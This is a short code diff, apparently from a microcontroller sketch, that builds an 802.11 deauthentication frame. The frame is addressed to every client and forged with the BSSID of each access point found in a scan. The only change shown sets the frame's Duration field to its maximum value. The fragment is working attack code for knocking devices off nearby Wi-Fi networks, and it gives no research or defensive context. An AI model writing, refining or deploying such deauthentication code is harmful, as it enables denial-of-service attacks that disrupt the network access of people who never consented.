@@ -43,7 +43,7 @@ void loop() {
     // Construct deauth frame
     uint8_t deauthPacket[26] = {
       0xC0, 0x00,  // Frame Control (Deauth frame)
-      0x3A, 0x01,  // Duration
+      0xFF, 0xFF,  // Duration
       0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast Destination MAC
       WiFi.BSSID(i)[0], WiFi.BSSID(i)[1], WiFi.BSSID(i)[2], // AP BSSID
       WiFi.BSSID(i)[3], WiFi.BSSID(i)[4], WiFi.BSSID(i)[5], // AP BSSID
